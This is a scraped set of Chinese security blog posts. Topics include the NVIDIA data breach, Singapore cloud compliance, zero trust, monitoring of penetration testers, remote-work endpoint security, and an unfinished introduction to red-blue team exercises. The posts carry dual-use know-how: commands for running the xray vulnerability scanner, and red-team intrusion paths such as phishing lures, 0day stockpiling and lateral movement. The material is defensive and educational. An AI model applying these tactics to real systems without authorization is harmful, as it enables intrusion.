GPU 驱动程序代码和固件","path":"/2022/02/23/apt/apt-nvidia/","content":"英伟达泄露黑客威胁要发布 NVIDIA GPU 驱动程序代码、固件和哈希率限制器绕过几天前，我们发现 NVIDIA 公司遭到黑客攻击，攻击者设法从该公司窃取了大约 1 TB 的敏感数据。这包括各种文件，如 GPU 驱动程序和 GPU 固件源代码以及一些更有趣的东西。负责这次攻击的 LAPSUS$ 黑客组织现在威胁要“帮助采矿和游戏社区”，为 Lite Hash Rate (LHR) GPU 哈希率限制器发布绕过解决方案。正如该小组所指出的，适用于 GA102-GA104 之间的任何东西的完整 LHR V2 解决方法正在销售中，并准备好进一步传播。 新闻报道https://www.techpowerup.com/292512/nvidia-data-breach-hackers-demand-geforce-drivers-be-made-open-sourcehttps://www.bleepingcomputer.com/news/security/nvidia-confirms-data-was-stolen-in-recent-cyberattack/ 英伟达确认数据泄露2022 年 2 月 23 日，NVIDIA 获悉一起影响 IT 资源的网络安全事件。发现事件后不久，我们进一步强化了网络，聘请了网络安全事件响应专家，并通知了执法部门。我们没有证据表明勒索软件被部署在 NVIDIA 环境中，或者这与俄罗斯-乌克兰冲突有关。但是，我们知道威胁参与者从我们的系统中获取了员工凭证和一些 NVIDIA 专有信息，并开始在网上泄露这些信息。我们的团队正在努力分析这些信息。我们预计该事件不会对我们的业务或我们为客户提供服务的能力造成任何干扰。安全是一个持续的过程，我们在 NVIDIA 非常重视 - 我们每天都在投资于代码和产品的保护和质量。 数据分析Telegram ID LAPSUS$ LAPSUS$ Chat NVIDIA_LEAKS_PARTONE.torrent 继 LAPSUS$ 勒索组织泄露 NVIDIA 源代码后， @BleepinComputer报告称，已使用被盗的 NVIDIA 证书在野外识别出恶意软件。Cert: integdev_gpu_drv&#x2F;integ&#x2F;gpu_drv&#x2F;stage_rel&#x2F;tools&#x2F;Security&#x2F;COPPTweet: #LeakedCertificate","tags":["APT"],"categories":["网络攻防"]},{"title":"未来的网络安全防护，凡我不能仿真的，我就不能防御","path":"/2021/09/09/security-architecture/future-security-protection/","content":"背景随着攻防演变和对抗成本的提升，攻破安全防线的地点从层层防御的生产网，快速转移到缺乏防护的个人终端。近期的多起网络钓鱼事件，逐步展现出社工攻击的威力，必然会成为企业新的防御重心。 凡我不能仿真的，我就不能防御借用费曼大师的一句话: “凡我不能仿真的，我就不能防御”，建立一个可持续迭代的APT闭环防护方案。 1234APT情报 -&gt; APT模拟仿真 -&gt; APT防护APT组织事件 漏洞原理复现 攻击特征捕获先进武器平台 武器靶场实测 联动应急止损0day漏洞预警 红蓝对抗演习 复盘能力迭代 未来的生产网安全防护风险：哪些是最有价值的资源？哪些数据不能被盗？哪些系统和运营不能中断？如果被摧毁，最昂贵的资源是什么（在金钱和时间方面）？ 红蓝实战攻防，未来的生产网安全防护：网络位置无关（数据中心、公有云、私有云或第三方托管），网络边界（DDoS&#x2F;FW&#x2F;IDS&#x2F;WAF&#x2F;TLS），可信计算（TPM&#x2F;BIOS&#x2F;Boot&#x2F;OS），微服务（强制安全策略&#x2F;安全补丁迭代&#x2F;容器隔离&#x2F;服务身份&#x2F;服务鉴权），代码和配置（漏洞检测&#x2F;签名&#x2F;来源）。红蓝实战攻防，核心资产评估：哪些是最有价值的资源？哪些数据不能被盗？哪些系统和运营不能中断？哪些资源在金钱和时间方面的是最昂贵？ 欢迎安全圈朋友&#x2F;大佬，一起交流哈~","tags":["APT","0Day"],"categories":["安全体系"]},{"title":"新加坡云服务安全合规概览","path":"/2021/06/09/security-architecture/singapore-security-compliance/","content":"一、法律法规及监管要求PDPA：个人数据保护法PDPA：个人数据保护法。为新加坡的个人数据提供了数据保护的基线标准，整体规范了组织对个人数据的收集、使用和披露，保障个人数据保护的权利，既承认个人数据保护的权力，也承认数据控制者出于合理目的收集、适用和披露个人数据的必要性。 https://sso.agc.gov.sg/Act/PDPA2012 基本义务主要包括：通知及同意、目的限制、访问及更正、准确性、保护、保留限制、转移限制、泄露通知、问责义务。 CSA：新加坡网络安全局《网络安全法》CSA：新加坡网络安全局《网络安全法》。此法案于2018年5月生效，旨在保护新加坡的基础设施和关键信息通信技术安全。它要求组织实施必要的安全措施以防范网络攻击，并要求组织及时报告与网络安全相关的事件。 https://posts.careerengine.us/p/5dc8359be51e7863363f201c 主要内容：加强对关键基础设施的保护，防范网络攻击；授权新加坡网络安全局预防和应对网络安全威胁和事件；建立共享网络安全信息的框架；为网络安全服务提供商设立许可证制度。 CMCA：《计算机滥用与网络安全法》CMCA： 《计算机滥用与网络安全法》。该法案于1993年颁布，针对的是计算机犯罪行为，包括未经授权访问计算机、破坏计算机系统或数据等。2013年修订后，该法案还覆盖了涉及到网络安全方面。 http://images.policy.mofcom.gov.cn/article/201601/1452235217511.pdf 主要内容：为非法攻击计算的行为和相应的惩罚罚款监禁。4.未经授权访问计算机材料 5.实施或协助实施犯罪 6.未经授权修改电脑资料 7.未经授权使⽤或截取计算机服务 8.未经授权妨碍使⽤计算机。9.未经授权泄露访问代码 10.加强对涉及受保护计算机的犯罪的惩罚 11. 教唆和未遂可作为犯罪处罚。 二、云服务安全合规认证ISO&#x2F;IEC 27001 认证ISO&#x2F;IEC 27001是目前国际上被广泛接受和应用的信息安全管理体系认证标准。该标准以风险管理为核心，通过定期评估风险和对应的控制措施来有效保障组织信息安全管理体系的持续运行。获得ISO&#x2F;IEC 27001认证证书，表明云服务商能够提供一个符合国际公认信息安全标准的云环境。 CSA STAR 认证CSA STAR认证是由英国标准协会(BSI)和云安全联盟（CSA）联合推出国际范围内的针对云安全水平的权威认证，旨在应对与云安全相关的特定问题。CSA STAR以ISO&#x2F;IEC 27001认证为基础，结合云端安全控制矩阵CCM的要求，运用BSI提供的成熟度模型和评估方法，综合评估组织云端安全管理和技术能力。 新加坡多层云端安全性 (MTCS) 标准新加坡多层云安全 (MTCS) 标准是在新加坡资讯通信发展管理局 (IDA) 信息技术标准委员会 (ITSC) 的指导下拟定的。MTCS 旨在提供：常用标准，云服务提供商 (CSP) 可采用该标准来解决客户对云端数据的安全性和机密性以及使用云服务对业务的影响的顾虑。可验证的操作透明度，以及对客户在使用云服务时所面临的风险的洞察。 https://learn.microsoft.com/zh-cn/compliance/regulatory/offering-MTCS-Singapore 三、云服务合规保护措施 云服务提供商应定期进行合规性检查和重新评估其对安全基线要求的遵守情况。 云服务提供商应定期进行安全测试、安全漏洞评估，安装最新可用的安全相关补丁。 通过身份认证和访问控制技术，实施基于角色所需最小权限的策略，防止未授权处理个人数据的行为； 广泛采用加密技术对客户个人数据进行加密存储和传输，确保个人数据存储和传输中的安全，防⽌数据泄露； 通过日志记录和审计技术，及时发现潜在的安全隐患以便及时迅速的做出反馈，解决问题。 主要的安全防护技术方法： 统一身份认证，提供身份认证和权限管理功能，可以管理用户（比如员工、系统或应用程序）帐号，并且可以控制这些用户对其名下资源的操作权限。可通过IAM采取适合的用户管理、身份认证和细粒度的云上资源访问控制等措施，防止对内容数据进行的未授权修改。 操作日志审计，提供云帐户下资源的操作记录，实现安全分析、合规审计、问题定位等场景。 数据加密服务，提供专属加密、密钥管理、密钥对管理等功能，进行密钥全生命周期集中管理，保障数据存储过程中的安全性。 数据传输加密，在内外网均采用HTTPS、WSS进行加密传输，保证传输过程安全，保证信息不会被中间人篡改、窃取。 漏洞扫描器，可自动识别网站或服务器暴露在网络中的安全威胁，从而保护数据的完整性。 应用防火墙，保护其网站或服务器免受外部攻击，避免这些攻击影响Web应用程序的可用性、安全性或过度消耗资源，降低数据被篡改、失窃的风险。 堡垒机系统，对云主机进行远程运维，提 高客户的访问控制安全能力，保护资源运维 和系统管理的安全性，降低系统和运维资源 被非法入侵的风险。 参考资料 海外网络安全与数据合规法律观察：新加坡篇 https://www.sohu.com/a/352260767_120304891 新加坡合规常见问题：https://www.huaweicloud.com/securecenter/compliance/compliance-center/sg.html 解读：2021新加坡网络安全战略 https://www.secrss.com/articles/36020","tags":["安全管理"],"categories":["安全体系"]},{"title":"xray 代理模式进行漏洞扫描","path":"/2021/01/03/xray/","content":"xrayxray 代理模式进行漏洞扫描 https://www.cnblogs.com/zzjdbk/p/13196657.html 下载 xray https://github.com/chaitin/xray/releases 生成 ca 证书 运行 .\\xray_windows_amd64.exe genca 浏览器 安装 ca 证书参考文章截图 启动代理 .\\xray_windows_amd64.exe webscan –listen 127.0.0.1:7777 –html-output xray-testphp.html 浏览器 配置代理参考文章截图 限制扫描范围参考文章截图 mitm 中 restriction 中 includes 由 * 改为 testphp.vulnweb.com","tags":["漏洞扫描","xray"],"categories":["安全工具"]},{"title":"零信任安全架构","path":"/2020/01/20/secbook/zero-trust-security-architecture/","content":"背景过去企业会将防御重点放在使用防火墙和VPN保护网络访问上，并假设网络内部的一切都是安全的。但是今天，随着云或远程办公的发展，网络安全威胁日益增加，企业需要更高效、更安全的网络安全架构保护企业安全。 零信任架构关注于保护资源、而非网络分段，因为网络位置不再被视为资源安全态势的主要组成部分。企业不应自动信任内部或外部的任何人&#x2F;事&#x2F;物、不应该根据物理或网络位置对系统授予完全可信的权限，应在授权前对任何试图接入企业系统的人&#x2F;事&#x2F;物进行验证、对数据资源的访问只有当资源需要的时候才授予。 ●2010年：零信任安全最早由 Forrester 的首席分析师约翰.金德维( John Kindervag )提出。 ●从2014年：Google 发表了6篇 BeyondCorp 相关的论文，全面介绍 BeyondCorp 架构和实施情况。 ●2017年：业界厂商大力跟进，包括思科、微软、亚马逊等。 ●2018年至今：中央部委、国家机关、中大型企业开始探索实践零信任安全架构。 零信任概念零信任是一种网络安全理念，通过降低对网络中的所有实体的信任，来增强网络安全。它认为任何网络实体，无论是内部或外部的，都不应被自动信任，并且应该经过验证和授权才能访问网络上的数据和资源。 零信任安全架构的使用是为了抵御新兴的网络安全威胁，如黑客、恶意软件等。随着网络技术的发展，网络安全威胁也在不断变得复杂。零信任安全架构通过在网络的各个层面降低信任，以确保网络的安全。 零信任核心原则在《零信任网络》一书中，埃文.吉尔曼（Evan Gilman）和道格.巴斯(Doug Barth)将零信任的定义建立在如下五个基本假定之上： 1网络无时无刻不处于危险的环境中。 2网络中自始至终存在外部或内部威胁。 3网络的位置不足以决定网络的可信程度。 4所有的设备、用户和网络流量都应当经过认证和授权。 5安全策略必须是动态的，并基于尽可能多的数据源计算而来 零信任总体框架美国国家标准与技术研究院NIST特别出版物 SP800-207《零信任架构》定义的零信任体系架构，通过增强的认证和授权机制来保护网络。它强制执行“零信任”原则，不管用户或资源在物理位置上如何，所有请求都必须经过认证和授权。对于任何请求，都必须在执行之前证明该请求是从可信资源发出的，并且该请求操作是合法的。 零信任架构使用多重安全控制，包括静态和动态身份验证、策略管理、安全管理和威胁情报，以确保安全。它还要求实现对网络流量的可见性和控制，以确保任何未经授权的活动都能被检测和阻止。 零信任安全架构构建零信任安全架构的实现过程中，需要通过多种手段来确保安全，如： 1身份包括网路、设备、用户、应用等，通过对身份进行验证来构建访问控制体系而非网络位置； 2默认所有的访问都是不安全的，所以所有的资源都应该受安全保护，而不是只保护一部分资源； 3资源按照当前身份执行任务的最小需求分配； 4零信任的发展离不开大数据的发展，正因为有足够的多源数据能够进行计算分析，授权才能真正从静态发展为动态； 5最终进行授权决策的时候，应该根据身份信息、权限信息和评估出来的信任等级形成动态的控制策略去控制访问的准入。 零信任关键技术身份管理系统●身份标识：识别访问系统的个体，以便识别用户身份。 ●身份验证：确认访问系统的个体是否是所认识的用户，以确认用户身份。 ●授权：根据确认的用户身份，决定用户是否具有访问系统的权限。 ●可问责性：跟踪和记录用户对信息系统、应用程序或数据的访问，以便在需要时追查责任。 访问控制引擎●DAC (Discretionary Access Control)：自主访问控制：用户自行决定是否具有访问系统的权限。 ●MAC (Mandatory Access Control)：强制访问控制：系统管理员决定用户是否具有访问系统的权限。 ●RBAC (Role-Based Access Control)：基于角色的访问控制：根据用户的角色决定用户是否具有访问系统的权限。 ●ABAC (Attribute-Based Access Control)：基于属性的访问控：根据用户的属性，如用户所在的组织机构或用户的职务，决定用户是否具有访问系统的权限。 访问代理网关软件定义边界，通过软件的方式，为企业构建起虚拟边界，利用基于身份的访问控制以及完备的权限认证机制，为企业应用和服务提供隐身保护，使网络黑客看不到目标而无法对企业的资源发动攻击，有效保护企业的数据安全。SDP 具有以下特点： ●网络隐身：没有对外暴露的 DNS、IP 地址或端口，必须通过授权的SDP客户端使用专有的协议才能进行连接，攻击者无法获取攻击目标。 ●预验证：用户和终端在连接服务器前必须提前进行验证，确保用户和设备的合法性。 ●预授权：依据最小权限原则，在设备接入前授予完成任务所需的应用和最小访问行为权限。 ●应用级的访问准入：用户只有应用层的访问权限，理论上无法获取服务器的配置、网络拓扑等其他信息，无法进行网络级访问。 https://csrc.nist.gov/csrc/media/publications/sp/800-162/final/documents/sp800_162_draft.pdf","categories":["攻防兼备企业安全实践"]},{"title":"白帽子渗透行为监控方案","path":"/2020/01/19/secbook/white-hat-penetration-behavior-monitoring-solution/","content":"对于白帽子行为监控方案，一般常用的技术手段是 VPN 加上跳板机。VPN 是帮助外部白帽子能够 VPN 拨入到客户的内部网络，对不接入公网的内部系统进行访问。确保内部系统不直接对公网开放。如果是放在公网上的系统，不能限制路由，VPN 的方案不适用。 监控白帽子的行为，现有两种可能的方案，需要评估哪种更可行： 1.批量生成云主机，把云主机账户给到白帽子使用，白帽子通过分配的云主机对目标系统进行漏洞挖掘。需要在分配给白帽子的云主机上，实现自动操作命令的收集，并且这些 log 不存在本地，实时送到目标 Log 日志服务器上。需要进行操作系统内核编译，禁止白帽子对日志进行修改的权限。 2.提供一台跳板机给所有白帽子，通过跳板机跳到分配给白帽子的云主机上，白帽子从云主机发起对目标客户的扫描和漏洞分析。需要在跳板机上记录所有白帽子的操作，跳板机自动跳转到分配给白帽子的云主机上，白帽子可以利用云主机进行安全扫描工具的下载与渗透侦测。 对比两种白帽子行为监控模式独立主机监控模式 优势：拓扑简单，部署简单，单台云主机完成全部监控，将日志发送到日志服务器 拥有独立公网 IP 地址，可以进行反弹后门操作，通过 IP 区分不同白帽子 劣势：由于白帽子测试需要 root 权限，能够完全控制操作系统，同时也能绕过监控手段 拥有独立公网 IP 地址，可以建立隧道，绕过监控，在未监控的主机上操作 可行性：由于白帽子拥有最高权限，所以需要花费大量精力防止绕过，开发工作量大，时间长 （例如本地记录篡改、内核模块监控、防止远程隧道、修改路由日志服务不可用） （内核审计方向[复杂+难绕过]、bash 审计方向[简单+用户约束]） 透明跳板机模式 优势：白帽子在进入操作机的时候，已经通过了一层透明的跳板机，在跳板机记录行为，无感知无法篡改。只有内网 IP 地址，能够通过 nat 上网，不能建立隧道。不需开发监控程序，跳板机完成监控记录 劣势：需要一个跳板机、操作机、NAT 网络的拓扑结构，共用外网 IP 地址。只有内网 IP 地址，一些测试和工具无法使用。 可行性：环境搭建维护工作量大，时间较短。 1.拓扑结构 2.行为记录方案2.1 白帽子监控过程白帽子通过浏览器访问监控机，输入账号密码进行登录 登录成功后，自动跳转到操作机，监控机记录白帽子行为，无感知无法篡改 2.2 账号开通流程 确定参与测试白帽子的数量、时间、用户 ID 和需要开通的操作系统类型 在监控机手动配置开通用户 ID 的使用权限，绑定云主机，分配密码 手动创建相应数量的操作机（云主机），分配操作系统、内存、CPU 和 IP 地址 2.3 事后溯源记录监控机记录下，白帽子的全部操作行为，操作监控记录文件，如下： Linux 回放： Windows 回放： 2.4 行为记录存储根据合同要求，白帽子行为记录，需要保存的时间。 目前单个云盘最大支持 3TB 存储，24 小时监控录像估算占用 1G 磁盘 2.5 访问控制每台主机都配置了公网 IP 地址，可以绕过监控机直连测试机，或者使用公网 IP 做转发，所以只允许出流量，禁止入方向流量。 3.方案成本3.1 监控机(云主机)价格Centos 6.5 8 核 12G 内存 30Mbps 带宽 ￥130&#x2F;天 3.2 操作机(云主机)价格Windows 2008 4 核 8G 内存 5Mbps 独立 IP ￥30&#x2F;天&#x2F;台 Centos 6.5 2 核 4G 内存 5Mbps 独立 IP ￥20&#x2F;天&#x2F;台 4.白帽子测试机使用方法4.1 安全测试平台：(仅活动期间开放)网址：http://1.1.1.1:8080/webrdp/ 输入账号和密码。 4.2 操作使用：（注意：退出测试机，请直接关闭浏览器窗口）白帽子通过浏览器访问测试机，输入账号密码进行登录 登录成功后，自动跳转到测试机，开始对目标网站进行安全测试。","categories":["攻防兼备企业安全实践"]},{"title":"终端安全与远程办公","path":"/2020/01/18/secbook/terminal-and-remote-office-security/","content":"背景随着企业数字化的推广，远程办公模式在全球范围内得到了快速兴起。数字化技术为远程办公提供了强有力的支持，包括在线协作工具、云存储和虚拟会议解决方案。远程办公不仅可以提高工作效率，还可以帮助减少通勤时间和成本。同时远程办公也带来了安全挑战，例如： ●网络攻击：远程员工使用家庭网络和公共网络时存在安全风险。 ●数据泄露：由于使用不安全的网络和设备，数据很容易被黑客窃取。 ●病毒和恶意软件：使用不受信任的设备和网络时容易受到病毒和恶意软件的感染。 ●社会工程攻击：社交工程攻击利用人们的信任感来获取敏感信息。 远程办公安全对于保护个人和公司信息和资产非常重要。由于网络和设备的不安全性，远程办公环境存在许多安全风险，包括网络攻击、数据泄露、病毒感染等。采取适当的安全措施，以保护敏感信息和避免安全威胁，是非常重要的。 远程办公安全防范措施远程办公员工可能在使用不安全的网络时，遭到信息监听，导致敏感信息泄露。远程办公员工可能使用不安全的设备，如旧版操作系统、不安全的浏览器等，导致系统漏洞。远程办公员工可能下载恶意软件，导致系统感染，数据泄露。远程办公员工可能遭到社工攻击，如钓鱼网站、诈骗电话等，导致数据泄露和网络安全漏洞。这些风险可能对企业的利益和声誉造成严重的影响，因此需要持续建立和完善远程办公安全防范措施。 ●身份验证：严格的身份验证方案，包括多因素身份验证和动态密码。 ●安全的网络连接：使用安全的网络连接方式，例如VPN或安全的传输。 ●加密数据：对数据进行加密，以确保数据的隐私和安全。 ●访问控制：实施严格的访问控制策略，以限制对敏感信息的访问。 ●防护技术：安装防护技术，例如防病毒软件和防火墙。 ●审核日志：监控并审核网络活动，以识别潜在的安全威胁。 ●安全教育：对用户进行安全教育和培训，以提高他们对网络安全的意识。 ●设备管理：实施终端设备管理，包括安装最新的安全补丁和限制设备使用。 ●数据备份：定期备份数据以防止数据丢失。 ●应急预案：制定应急预案，以在发生安全事件时进行快速响应。 IAM统一身份管理IAM（Identity and Access Management）统一认证平台是一种访问控制系统，用于管理用户对网络、应用程序和数据的访问权限。它涵盖了身份认证、授权、访问控制等多个环节，为用户提供统一的登录体验，同时可以提高系统的安全性。 IAM统一认证平台是身份安全的重要工具，可以提高系统的安全性和效率。 1认证授权：通过多因素身份验证和授权机制，可以有效防止非法访问。 2访问策略：可以灵活的分配用户的访问权限，以满足不同业务需求。 3安全审计：通过系统审计功能，可以追踪用户的访问行为，更好地评估系统的安全性。 4工作效率：通过统一的登录体验，可以减少用户的登录次数，提高工作效率。 IAM安全技术防护●认证技术：使用认证技术，如数字证书、用户名&#x2F;密码、多因素认证等，确保用户身份的准确性。 ●授权技术：使用授权技术，控制用户对系统资源的访问权限，如RBAC（基于角色的访问控制）、ABAC（基于规则的访问控制）等。 ●访问控制：使用访问控制技术，控制用户对系统资源的访问，保护系统安全。 ●单点登录：使用单点登录技术，实现用户只需要登录一次就可以访问所有系统，提高用户体验。 VPN安全管理随着远程办公模式的普及，员工可能在外网环境下访问组织内的数据，这增加了数据安全的风险。因此，需要采用更严格的安全措施来保护数据和网络的安全。VPN安全管理方案可以通过加密网络数据流量和提供安全的远程访问通道来保护组织的数据和资源。 建立安全的私有网络，通过加密和验证机制保护数据的安全性。通过加密和验证机制，可以有效防止数据的泄露和损坏。保护网络流量的隐私，防止网络攻击和监听。通过多种方式访问组织内的数据和资源，提高网络可用性。 VPN安全技术防护●加密技术：使用加密技术，如IPSec、SSL&#x2F;TLS等，加密网络数据传输，保护数据安全。 ●认证技术：使用认证技术，如数字证书、用户名&#x2F;密码等，验证用户身份，确保网络连接安全。 ●防火墙技术：使用防火墙技术，控制网络流量，防止未经授权的访问。 ●用户管理：使用用户管理技术，管理VPN用户的访问权限和策略，保护网络安全。 ●日志管理：使用日志管理技术，记录VPN网络的活动日志，方便审计和安全管理。 ●虚拟专用网络（VPN）软件：使用专门的VPN软件，管理VPN网络的连接和数据传输。 WiFi安全管理随着移动设备和移动应用程序的普及，WiFi网络已经成为了人们日常生活和工作的重要部分。然而，WiFi网络也存在着许多安全风险，如数据泄露、网络攻击等。 通过综合利用多项技术和管理措施，确保WiFi网络的安全和可靠性，保护网络资源和敏感信息的重要措施。它不仅可以保障WiFi网络的正常运行，还可以降低网络安全风险，保护网络资源和敏感信息的安全。 WiFi安全技术防护●网络设计：包括WiFi网络的拓扑结构设计和安全技术选型。 ●加密技术：WPA2、WPA3等加密技术可以加密WiFi数据流量，防止数据泄露。 ●认证技术：包括用户名密码认证、证书认证等，保证只有授权的用户可以访问WiFi网络。 ●防火墙：防火墙可以防止网络攻击和恶意软件的入侵。 ●入侵检测系统：入侵检测系统可以检测和响应网络攻击，防止数据泄露。 ●网络审计：可以监测无线网络中的活动情况，检测潜在的安全风险。 ●访问点管理：通过对WiFi访问点的管理，可以实现对WiFi网络的有效控制和监测。 终端安全管理 Windows 1远程登录检测，检测设备是否启用远程登录 2锁屏密码检测，检测设备是否设置锁屏密码 3自动锁屏检测，检测设备是否开启自动锁屏 4系统防火墙检测，检测设备是否开启系统防火墙 5杀毒软件检测，检测设备是否安装了杀毒软件 6连接不安全网络，检测设备连接是否连接不安全网络 7访客账户检测，检测设备是否存在Guest账户 8高危服务检测，检测设备是否启用共享服务 9私开热点检测，检测设备是否开放移动热点 Mac 1应用签名检测，检测设备是否开启应用签名验证 2访客账户检测，检测设备是否存在Guest账户 3文件保险箱检测，检测设备是否开启文件保险箱 4锁屏密码检测，检测设备是否设置锁屏密码 5自动锁屏检测，检测设备是否开启自动锁屏 6系统防火墙检测，检测用户的设备是否设置了系统防火墙 7杀毒软件检测，检测设备是否安装了杀毒软件 8远程登录检测，检测设备是否启用远程登录 9自动登录检测，检测设备是否启用了自动登录 iOS 1越狱检测，检测设备是否越狱 2网络代理设置检测，检测设备是否配置网络代理 3锁屏密码检测，检测设备是否设置了锁屏密码 4系统版本检测，检测设备操作系统版本是否过低 Android 1用户证书检测，检测设备是否安装了用户证书，可被抓包或流量劫持 2ROOT检测，检测设备是否被ROOT 3网络代理设置检测，检测设备是否配置网络代理 4开发者模式启用检测，检测设备是否开启开发者模式 5开发者模式使用状态检测，检测设备是否开启开发者模式并处于调试中 6锁屏密码检测，检测设备是否设置了锁屏密码 7图案锁屏密码检测，检测用户是否设置了图案类型的锁屏密码 恶意代码防护随着数字化的普及，恶意代码的数量和复杂性不断增加，对企业网络安全造成了严重威胁。恶意代码（如病毒、间谍软件、勒索软件等）已经成为现代网络安全的主要威胁之一。恶意代码防护是一种防御性的网络安全措施，阻止攻击者利用恶意代码对网络系统造成破坏。 恶意代码的危害 恶意代码，又称为恶意软件、病毒、木马等，是在电脑系统、网络环境或手机应用程序中传播的恶意程序。它们可以通过各种方式，如邮件附件、网站下载、网络共享、诱骗用户安装等方式传播。没有恶意代码防护的网络系统易受到破坏和数据泄露的威胁 恶意代码的危害主要包括●破坏电脑系统、网络环境，可能导致系崩溃、数据丢失或损坏； ●窃取敏感信息，恶意代码可以盗取用户的个人信息，如账号密码、银行卡号、信用卡信息等； ●网络安全漏洞，恶意代码可以利用网络安全漏洞，如蠕虫病毒和木马程序，攻击企业和个人的网络环境； ●资源滥用，恶意代码可以占用大量系统资源，导致电脑系统运行缓慢，影响正常工作； ●网络攻击，恶意代码可以作为攻击手段，如DDos攻击等，对网络环境造成严重影响。 恶意代码类型和事件●SolarWinds：2020年，SolarWinds公司的网络管理软件被黑客植入恶意代码，导致多家公司和政府机构的网络被入侵，敏感信息被盗取。 ●WannaCry勒索病毒：2017年，WannaCry勒索病毒攻击了全球范围内的数百万台电脑。该病毒通过网络传播，并加密了受感染系统中的数据，要求用户支付赎金才能解密。 ●Stuxnet：2010年，Stuxnet恶意代码对伊朗核电站造成了严重的影响，这是一次针对工业控制系统的高级攻击。 ●病毒感染：恶意代码在系统或设备中感染，影响正常运行并传播到其他系统或设备。 ●木马攻击：恶意代码控制计算机系统并获取敏感信息，如密码。 ●蠕虫感染：恶意代码自我传播，影响网络性能。 ●勒索软件：恶意代码加密用户的数据，要求用户支付赎金。 ●广告软件：恶意代码在用户设备上弹出广告。 恶意代码防护的安全技术●通过一系列手段防止恶意代码对系统、设备、网络、应用程序、数据等进行攻击。这些技术包括： ●防病毒（Anti-Virus）软件：通过使用病毒扫描器对系统和数据进行实时扫描，识别并防止病毒的传播。 ●边界保护：通过对数据包进行审查，防止恶意代码或其他不受信任的代码从外部网络入侵内部网络。 ●代码签名：对于应用程序和驱动程序签名，以确保代码的完整性和可信任的来源。 ●应用程序白名单：通过白名单的形式，只允许特定的、受信任的应用程序运行。 ●虚拟化技术：在隔离的虚拟环境中运行应用程序，以防止恶意代码造成影响。 数据防泄漏数据防泄露软件，判断终端设备上的文件是否为敏感文件。对数据外发途径进行安全审计。当终端设备上的敏感文件，通过已配置的检测外发方式进行文件外发操作，数据防泄露软件会对该行为进行截屏和取证处置。 代码外泄场景 从代码仓库，下载源代码。 将源码目录进行打包，拷贝到U盘，拷贝到IM软件，浏览器上传。 告警日志，都能够看到这些外泄行为，并且保存了截图和文件证据。 文档外泄场景 创建包含敏感词的文档（TXT PDF DOC ）。 将敏感文件，拷贝到U盘，拷贝到IM软件，浏览器上传。 告警日志，都能够看到这些外泄行为，并且保存了截图和文件证据。","categories":["攻防兼备企业安全实践"]},{"title":"红蓝对抗网络攻防实战演练","path":"/2020/01/17/secbook/red-blue-attack-and-defense-practice/","content":"一、红蓝对抗介绍蓝军是指在军事模拟对抗演习中专门扮演假想敌的部队，通过模仿对手的作战特征与红军进行针对性的训练对抗。国内企业安全蓝军（国外称为红队 RedTeam）以攻击者视角对人员、业务、基础设施、安全系统进行模拟攻击，持续暴露安全隐患和防控薄弱点，评估和促进企业安全的防御、监测和应急处置的整体安全水位。 红蓝对抗技术能力 红蓝对抗核心技战法 0day 挖掘储备 ●安全设备类：堡垒机漏洞、终端 EDR 漏洞、 ●流量监控设备漏洞、VPN 设备漏洞 ●企业产品类：邮服漏洞、OA 漏洞 社工与内网 ●社工：邮件钓鱼（邮件伪造、场景伪装） ●通讯钓鱼（招聘平台、通话欺骗）+水坑攻击 ●内网：安全产品集权类设备 + 域渗透 + 横向移动 外网打点 ●自动信息手收集 + 人工漏洞打点（0day、1day、供应链） 常见入侵路径 ●对外提供的服务； VPN 接入服务； ●分支机构、合作单位；旁站、C 段 二、高级持续性攻击风险APT 攻击是针对特定目标的高级持续性攻击（Advanced Persistent Threat）的简称。这种攻击通常由国家级或专业的网络攻击者发起，目的是长期侵入目标网络，收集机密信息。 APT 攻击的危害非常严重，因为它们可以持续很长时间，而攻击者可以不断收集敏感信息。它们还可能导致系统瘫痪、数据泄露、财务损失等。因此，重要的数据和网络安全必须通过多重防御措施，包括网络监测、强制访问控制、数据加密等，来防范 APT 攻击。 维基解密CIA绝密文件泄露事件2017年3月7日，维基解密（WiKiLeaks）公布了数千份文档并揭秘了美国中央情报局关于黑客入侵技术的最高机密，根据泄密文档中记录的内容，该组织不仅能够入侵iPhone手机、Android手机和智能电视，而且还可以入侵攻击Windows、Mac和Linux操作系统,甚至可以控制智能汽车发起暗杀活动。外界将此次泄漏事件取名为Vault 7，Vault 7公布的机密文件记录的是美国中央情报局（CIA）所进行的全球性黑客攻击活动。 Vault7包含8761份机密文档及文件，这些文件记录了CIA针对Android以及苹果智能手机所研发的入侵破解技术细节，其中有些技术还可以拿到目标设备的完整控制权。维基解密创始人阿桑奇表示，文件显示出“CIA网络攻击的整体能力”，而维基解密在发布这些文件时声称“CIA的网络军械库已失控”。 影子经纪人公开NSA（美国国家安全局）黑客武器库2017年4月14日，影子经纪人（Shadow Brokers）在steemit.com上公开了一大批NSA（美国国家安全局）“方程式组织” (Equation Group)使用的极具破坏力的黑客工具，其中包括可以远程攻破全球约70%Windows机器的漏洞利用工具。任何人都可以使用NSA的黑客武器攻击别人电脑。其中，有十款工具最容易影响Windows个人用户，包括永恒之蓝、永恒王者、永恒浪漫、永恒协作、翡翠纤维、古怪地鼠、爱斯基摩卷、文雅学者、日食之翼和尊重审查。黑客无需任何操作，只要联网就可以入侵电脑，就像冲击波、震荡波等著名蠕虫一样可以瞬间血洗互联网。 震网病毒 Stuxnet 2010年Stuxnet作为世界上首个网络“超级破坏性武器”，这也是第一次使用计算机病毒来操纵物理世界的事件。该病毒在伊朗工控系统潜伏了5年之久，并通过感染超过200,000台计算机以及导致1,000台机器物理降级，对伊朗整体核计划的约五分之一造成了重大损害。 三、红蓝对抗实战攻击案例红蓝对抗典型攻击途径 影子资产攻击对目标边缘影子资产进行迂回攻击。声东击西，穿插攻击。 多数情况下，攻击人员难以直接通过正面攻击获取权限，会利用自研的自动化攻击工具，以最快的速度在海量目标边缘资产中，找到可供突破的防守薄弱点。一般情况下，会先 采用自动化工具进行第一波突破，若无果，再采用遍历攻击面的方式，采用人工挖掘的方式，对目标资产进行细致的安全审查，以获取疏于防护的目标资产权限。 社工攻击针对目标相关人员进行社会工程学攻击。没有绝对安全的系统，人是网络安全的关键因素。 随着安全防护技术及安全防护产品应用的日益成熟，很多常规的攻击手段越来越难以奏效。通过前期收集到的人员信息与其相关业务信息，利用 QQ 群聊，微信聊天等方式，降 低目标人员的戒备心，并编写招聘广告，业务互动等符合目标个人需求的钓鱼木马，进行社会工程学攻击，进而成功突破具有高安全防护目标的安全策略。 0day 攻击利用 0day 漏洞对目标主要资产正面突破。攻敌之不备，出奇以制胜。 对常见通用系统进行漏洞挖掘，并储备充足的 0day 炮火支援。针对目标使用的通用系统，使用 